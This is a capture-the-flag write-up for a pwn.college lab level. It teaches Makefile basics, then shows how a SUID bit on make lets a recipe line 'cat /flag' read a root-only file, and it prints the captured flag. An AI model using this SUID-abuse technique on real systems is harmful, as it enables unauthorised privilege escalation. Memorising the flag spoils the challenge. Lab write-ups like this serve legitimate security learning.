`make`

Let's talk about `make` program. Start with an example. Let's make a simple c program that prints `hello world`. I made a directory in my home directory `demo`. Let's create a c program `test.c`

```bash
hacker@program-misuse-level-26:~$ ls
Desktop
hacker@program-misuse-level-26:~$ mkdir demo
hacker@program-misuse-level-26:~$ ls
Desktop  demo
hacker@program-misuse-level-26:~$ cd demo
hacker@program-misuse-level-26:~/demo$ touch test.c
hacker@program-misuse-level-26:~/demo$ ls
test.c
```

Now write the program.

```c
#include<stdio.h>

int main()
{
  printf("Hello world\n");
  return 0;
}
```

Then we have to compile it. Go to terminal and write this command.

```bash
hacker@program-misuse-level-26:~/demo$ gcc test.c -o test
hacker@program-misuse-level-26:~/demo$ ls
test  test.c
hacker@program-misuse-level-26:~/demo$ ./test 
Hello world
```

`gcc test.c -o test` compile the `test.c` program and create a object file named `test`. If we run the `test` executable file, it prints `Hello world`. 

Now the main part. Let's suppose we change something in the source file `test.c` let's suppose we `world` to `World`. Now we have to run the same `gcc test.c -o test` command again. What about running a simple command that'll do all the compilation work for us. It'll reduce out pain.

Yes, here comes the `makefile`. If you create a `makefile` and put this `gcc` command in the `makefile` and then run `make` command. It will recompile the source file.

The conventional name for `makefile` is `Makefile, makefile, GNUmakefile`. Go through the `man make` , you will learn a lot.

A simple makefile is :

```
'target1':
	command
	...
	...
'target2':
	command
	...
	...
```

`target` are blocks. if you run `make target1`, only the commands in the `target1` will be executed. one important note here, you should give 1 `tab` amount of space under the `target` name. It's syntax. Otherwise you will see `Makefile:2: *** missing separator.  Stop.`

Our makefile here is :

```Makefile
build:
	gcc test.c -o test
	ls
	./test
```

Here `build` is the target. 


```bash
hacker@program-misuse-level-26:~/demo$ touch Makefile
hacker@program-misuse-level-26:~/demo$ ls
Makefile  test  test.c
hacker@program-misuse-level-26:~/demo$ make
gcc test.c -o test
ls
Makefile  test  test.c
./test
Hello World
```

Now if we add `cat /flag` in the `Makefile` it will print the content of the `flag` file. As the `make` command has been given the `SUID` permission, it allows `flag` file to be executed with permission of the file owner(in this case, `root`).

When you execute a command from a makefile which has been granted the `SUID` bit, the command inherits the permission of the root user. So when we run the `cat /flag`, as if we were the `root` user. That's why it prints the flag.

```Makefile
build:
	gcc test.c -o test
	ls
	./test
	cat /flag
```

```bash
hacker@program-misuse-level-26:~/demo$ make
gcc test.c -o test
ls
Makefile  test  test.c
./test
Hello World
cat /flag
cat: /flag: Permission denied
make: *** [Makefile:5: build] Error 1
hacker@program-misuse-level-26:~/demo$ /challenge/babysuid_level26 
Welcome to /challenge/babysuid_level26!

This challenge is part of a series of programs that
will enable you to read flags by making them execute other commands.

I just set the SUID bit on /usr/bin/make.
Try to use it to read the flag!

IMPORTANT: make sure to run me (/challenge/babysuid_level26) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/make!
hacker@program-misuse-level-26:~/demo$ make
gcc test.c -o test
ls
Makefile  test  test.c
./test
Hello World
cat /flag
pwn.college{M_zDvIjfzLVFUh4Hs6m7Pgp_2u6.0FO2EDL0AjNzQzW}
```